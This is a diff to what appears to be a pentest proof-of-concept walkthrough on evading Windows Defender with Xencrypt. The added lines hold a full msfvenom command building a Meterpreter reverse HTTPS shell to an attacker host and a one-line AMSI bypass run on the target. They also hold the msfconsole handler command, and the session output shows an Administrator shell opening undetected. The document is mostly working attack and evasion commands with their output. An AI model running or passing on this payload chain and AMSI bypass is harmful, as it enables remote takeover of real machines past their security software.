@@ -189,6 +189,13 @@ PoC 3 - Example with a x64 Meterpreter reverse https shell (.ps1) encrypted 2 ti
 Step 1 - Generate a x64 Meterpreter reverse https shell in PowerShell format with the option 'psh-reflection'
 --------------------------------------------------------------------------------------------------------------
 
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.1.30 LPORT=443 -a x64 -f psh-reflection -o meterpreter-x64-reverse-https.ps1
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 201308 bytes
+Final size of psh-reflection file: 270926 bytes
+Saved as: meterpreter-x64-reverse-https.ps1
+
 
 Step 2 - Encrypt the powershell script containing the x64 Meterpreter reverse https shell with 2 iterations of Xencrypt
 ------------------------------------------------------------------------------------------------------------------------
@@ -217,7 +224,9 @@ This is free software, and you are welcome to redistribute it under certain cond
 Step 3 - AMSI bypass + Execution on a target Windows machine of the encrypted powershell script containing the x64 Meterpreter reverse https shell
 ---------------------------------------------------------------------------------------------------------------------------------------------------
 
-PS C:\user\administrator> . .\Invoke-meterpreter-x64-reverse-https-encrypted.ps1
+PS C:\Users\Administrator> $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
+PS C:\Users\Administrator> 
+PS C:\Users\Administrator> . .\Invoke-meterpreter-x64-reverse-https-encrypted.ps1
 
 => The MS Defender AV is neabled and up-to-date on the target Windows machine but it does not detect nor block the Meterpreter shell.
 
@@ -225,5 +234,75 @@ PS C:\user\administrator> . .\Invoke-meterpreter-x64-reverse-https-encrypted.ps1
 Step 4 - You hav now a meterpeter shell running 
 -------------------------------------------------
 
+jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem;  run -j"
+[sudo] password for jeff: 
+[!] The following modules were loaded with warnings:
+[!]     /usr/share/metasploit-framework/modules/encoders/x86/bf_xor.rb
+[!] Please see /root/.msf4/logs/framework.log for details.
+                                                  
+*TeamFastMark*Towson-Cyberkatz*meow*xrzhev*PA Hackers*Kuolema*Nakateam*L0g!c B0mb*NOVA-InfoSec*teamstyle*Panic*
+*B0NG0R3*                                                                                    *Les Cadets Rouges*buf*
+*Les Tontons Fl4gueurs*                                                                      *404 : Flag Not Found*
+*' UNION SELECT 'password*      _________                __                                  *OCD247*Sparkle Pony* 
+*burner_herz0g*                 \_   ___ \_____  _______/  |_ __ _________   ____            *Kill$hot*ConEmu*
+*here_there_be_trolls*          /    \  \/\__  \ \____ \   __\  |  \_  __ \_/ __ \           *;echo"hacked"*
+*r4t5_*6rung4nd4*NYUSEC*        \     \____/ __ \|  |_> >  | |  |  /|  | \/\  ___/           *karamel4e*
+*IkastenIO*TWC*balkansec*        \______  (____  /   __/|__| |____/ |__|    \___  >          *cybersecurity.li*
+*TofuEelRoll*Trash Pandas*              \/     \/|__|                           \/           *OneManArmy*cyb3r_w1z4rd5*
+*Astra*Got Schwartz?*tmux*                  ___________.__                                   *AreYouStuck*Mr.Robot.0*
+*\nls*Juicy white peach*                    \__    ___/|  |__   ____                         *EPITA Rennes*
+*HackerKnights*                               |    |   |  |  \_/ __ \                        *guildOfGengar*Titans*
+*Pentest Rangers*                             |    |   |   Y  \  ___/                        *The Libbyrators*
+*placeholder name*bitup*                      |____|   |___|  /\___  >                       *JeffTadashi*Mikeal*
+*UCASers*onotch*                                            \/     \/                        *ky_dong_day_song*
+*NeNiNuMmOk*                              ___________.__                                     *JustForFun!*
+*Maux de tête*LalaNG*                     \_   _____/|  | _____     ____                     *g3tsh3Lls0on*
+*crr0tz*z3r0p0rn*clueless*                 |    __)  |  | \__  \   / ___\                    *Phở Đặc Biệt*Paradox*
+*HackWara*                                 |     \   |  |__/ __ \_/ /_/  >                   *KaRIPux*inf0sec*
+*Kugelschreibertester*                     \___  /   |____(____  /\___  /                    *bluehens*Antoine77*
+*icemasters*                                   \/              \//_____/                     *genxy*TRADE_NAMES*
+*Spartan's Ravens*                       _______________   _______________                   *BadByte*fontwang_tw*
+*g0ldd1gg3rs*pappo*                     \_____  \   _  \  \_____  \   _  \                   *ghoti*
+*Les CRACKS*c0dingRabbits*               /  ____/  /_\  \  /  ____/  /_\  \                  *LinuxRiders*   
+*2Cr4Sh*RecycleBin*                     /       \  \_/   \/       \  \_/   \                 *Jalan Durian*
+*ExploitStudio*                         \_______ \_____  /\_______ \_____  /                 *WPICSC*logaritm*
+*Car RamRod*0x41414141*                         \/     \/         \/     \/                  *Orv1ll3*team-fm4dd*
+*Björkson*FlyingCircus*                                                                      *PwnHub*H4X0R*Yanee*
+*Securifera*hot cocoa*                                                                       *Et3rnal*PelarianCP*
+*n00bytes*DNC&G*guildzero*dorko*tv*42*{EHF}*CarpeDien*Flamin-Go*BarryWhite*XUcyber*FernetInjection*DCcurity*
 
+       =[ metasploit v6.1.14-dev                          ]
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
++ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
 
+Metasploit tip: To save all commands executed since start up 
+to a file, use the makerc command
+
+[*] Starting persistent handler(s)...
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/x64/meterpreter_reverse_https
+LHOST => 192.168.1.30
+LPORT => 443
+EXITFUNC => thread
+ExitOnSession => false
+SessionCommunicationTimeout => 0
+EnableUnicodeEncoding => true
+HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started HTTPS reverse handler on https://192.168.1.30:443
+msf6 exploit(multi/handler) > [!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: kplnlp8t) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: kplnlp8t) Redirecting stageless connection from /9yiHnCRtNRYZUhhQesySRguK5t_djJExKeTCJqtNJ9R6Wp9kLzWn with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: kplnlp8t) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: kplnlp8t) Attaching orphaned/stageless session...
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: kplnlp8t) Without a database connected that payload UUID tracking will not work!
+[*] Meterpreter session 1 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2022-12-18 04:37:59 +0100
+
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: PO718687\Administrator
+meterpreter > 
